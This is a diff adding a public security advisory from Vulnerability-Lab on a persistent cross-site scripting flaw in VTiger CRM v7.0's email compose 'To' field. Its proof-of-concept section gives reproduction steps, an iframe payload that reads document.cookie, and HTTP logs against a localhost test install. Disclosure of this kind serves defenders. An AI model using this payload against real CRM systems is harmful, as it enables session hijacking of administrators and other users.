@@ -1,0 +1,282 @@
+# Exploit Title: VTiger v7.0 CRM - 'To' Persistent XSS
+# Date: 2020-11-18
+# Exploit Vulnerability-Lab
+# Vendor Homepage: https://www.vtiger.com/open-source-crm/download-open-source/
+# Software Link: https://sourceforge.net/projects/vtigercrm/files/
+# Version: v7.0
+
+Document Title:
+===============
+VTiger v7.0 CRM - (To) Persistent Email Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2227
+
+
+Release Date:
+=============
+2020-11-18
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2227
+
+
+Common Vulnerability Scoring System:
+====================================
+4.8
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Vtiger CRM is web-application built using PHP. Choose the best CRM for
+your business. Custom Module & Relationship builder for
+VTiger is a very useful extension that allows crm administrators to
+create custom modules within few clicks. All custom modules
+are created following strict VTiger standards. In addition, the
+relationship builder allows crm admin to link together existing modules
+as well as new custom modules.
+
+(Copy of the Homepage:
+https://www.vtiger.com/open-source-crm/download-open-source/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a persistent
+cross site vulnerability in the VTiger v7.0 CRM open-source web-application.
+
+
+Affected Product(s):
+====================
+VTExperts
+Product: VTiger v7.0 - CRM (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-27: Public Disclosure (Vulnerability Laboratory)
+2020-04-28: Researcher Notification & Coordination (Security Researcher)
+2020-04-29: Vendor Notification 1 (Security Department)
+2020-05-30: Vendor Notification 2 (Security Department)
+2020-06-22: Vendor Notification 3 (Security Department)
+****-**-**: Vendor Response/Feedback (Security Department)
+****-**-**: Vendor Fix/Patch (Service Developer Team)
+****-**-**: Security Acknowledgements (Security Department)
+2020-11-18: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted Authentication (Guest Privileges)
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Full Disclosure
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official VTiger v7.0 CRM open-source web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The persistent cross site scripting web vulnerability is located in the
+`searchValue` Parameter of the `Emails Compose` module.
+Attackers are able to inject own mlicious script code in the `To` sender
+input field of the email compose module to attack other
+user accounts. The email can be delivered with multiple receipients
+which allows an attacker to insert the target email and a
+malicious payload. The request method to inject is GET via searchValue
+and POST on compose with persistent attack vector.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external
+redirects to malicious source and persistent manipulation of affected
+application modules.
+
+Request Method(s):
+[+] POST
+[+] GET
+
+Vulnerable Module(s):
+[+] Email Compose (index.php?module=Emails)
+
+Vulnerable Input(s):
+[+] To (Sender - Email)
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerability can be exploited by
+remote attackers with low privileged account and with low user interaction.
+For security demonstration or to reproduce the cross site web
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Url
+http://localhost:8080/vtigercrm/index.php?module=Vendors&relatedModule=Emails&view=Detail&record=3883&mode=showRelatedList&relationId=62&tab_label=Emails&app=INVENTORY#
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the web-application ui
+2. Login with a regular user role to the ui
+3. Open vendors and move to compose to email form
+4. Inject malicious payload as "to" sender information and as well a
+valid email to target
+5. Send the request after the compose
+6. Wait until the administrator or higher privileged targeted users
+click in the email or receives the email on preview
+7. Successful reproduce of the cross site scripting web vulnerability!
+
+
+PoC: Vulnerable Source (Execution Point)
+<div class="col-lg-12"><div class="col-lg-2"><span
+class="pull-right">To&nbsp;<span class="redColor">*</span></span></div>
+<div class="col-lg-6"><div class="select2-container
+select2-container-multi autoComplete sourceField select2"
+id="s2id_emailField" style="width: 100%;"><ul class="select2-choices
+ui-sortable">  <li class="select2-search-choice">
+<div>IT <b>(test@test.com)</b></div>    <a href="#"
+class="select2-search-choice-close" tabindex="-1"></a></li>
+<li class="select2-search-choice"><div><iframe src"evil.source"
+onload=alert(document.cookie)></div></iframe></div>
+
+
+--- PoC Session Logs [GET] ---
+http://localhost:8080/vtigercrm/index.php?module=Emails&action=BasicAjax&searchValue=>"<iframe+src%3Da+onload%3Dalert(document.cookie)>&_=1587844428851
+Host: localhost:8080
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer:
+http://localhost:8080/vtigercrm/index.php?module=Vendors&relatedModule=Emails&view=Detail&record=3883&mode=showRelatedList&relationId=62&tab_label=Emails&app=INVENTORY
+Cookie: PHPSESSID=ni2357om9nni5vvhovf20rkt51
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.10 (Debian)
+Content-Length: 28
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+-
+Content-Type: text/json; charset=UTF-8
+http://localhost:8080/vtigercrm/evil.source
+Host: localhost:8080
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+Referer:
+http://localhost:8080/vtigercrm/index.php?module=Vendors&relatedModule=Emails&view=Detail&record=3883&mode=showRelatedList&relationId=62&tab_label=Emails&app=INVENTORY
+Cookie: PHPSESSID=ni2357om9nni5vvhovf20rkt51
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.10
+Content-Length: 299
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+
+Reference(s):
+http://localhost:8080/vtigercrm/
+http://localhost:8080/vtigercrm/index.php
+http://localhost:8080/vtigercrm/index.php?module=Emails&action=BasicAjax&searchValue=
+
+
+Security Risk:
+==============
+The security risk of the persistent web vulnerability i the
+web-application is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
